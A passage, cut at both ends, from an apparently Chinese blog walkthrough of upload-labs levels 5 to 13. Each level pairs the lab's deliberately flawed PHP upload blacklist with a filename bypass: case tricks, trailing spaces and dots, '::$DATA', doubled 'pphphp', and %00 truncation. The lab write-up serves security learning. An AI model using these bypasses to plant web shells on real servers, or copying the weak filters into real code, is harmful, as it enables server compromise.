class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>大小写规则不全，可以使用<code>phP</code>后缀上传突破。</p><h2 id="第6关-空格"><a href="#第6关-空格" class="headerlink" title="第6关 空格"></a>第6关 空格</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用Windows系统<code>不解析空格</code>的文件名特性。文件名最后增加<strong>空格</strong></p><h2 id="第7关-点"><a href="#第7关-点" class="headerlink" title="第7关 点"></a>第7关 点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有删除结尾的“.”，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过</p><h2 id="第8关-DATA"><a href="#第8关-DATA" class="headerlink" title="第8关 DATA"></a>第8关 DATA</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是黑名单，但是没有对后缀名进行去<code>::$DATA</code>处理，利用windows特性，可在后缀名中加<code>::$DATA</code>绕过：<code>shell.php::$data</code></p><h2 id="第9关-点-空格-点"><a href="#第9关-点-空格-点" class="headerlink" title="第9关 点+空格+点"></a>第9关 点+空格+点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>黑名单过滤，注意下面这行和之前不太一样，路径拼接的是处理后的文件名:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;</span><br></pre></td></tr></table></figure><p>原理同Pass-06，上传文件名后加上<strong>点+空格+点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php. .</span><br></pre></td></tr></table></figure><h2 id="第10关-嵌套绕过"><a href="#第10关-嵌套绕过" class="headerlink" title="第10关 嵌套绕过"></a>第10关 嵌套绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只是删除而不是die：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>所以利用双写(嵌套)绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.pphphp</span><br></pre></td></tr></table></figure><h2 id="第11关-GET型00截断"><a href="#第11关-GET型00截断" class="headerlink" title="第11关 GET型00截断"></a>第11关 GET型00截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>白名单判断，但是<code>$img_path</code>直接拼接:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>相当于上传了<code>1.php%001.png</code></p><p>因此可以利用%00截断绕过：</p><ul><li>需关闭magic_quotes_gpc</li><li>php 版本&lt;5.3.4</li></ul><h2 id="第12关-POST型00截断"><a href="#第12关-POST型00截断" class="headerlink" title="第12关 POST型00截断"></a>第12关 POST型00截断</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>save_path是通过post传进来的:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。</p><h2 id="第13关-图马"><a href="#第13关-图马" class="headerlink" title="第13关 图马"></a>第13关 图马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 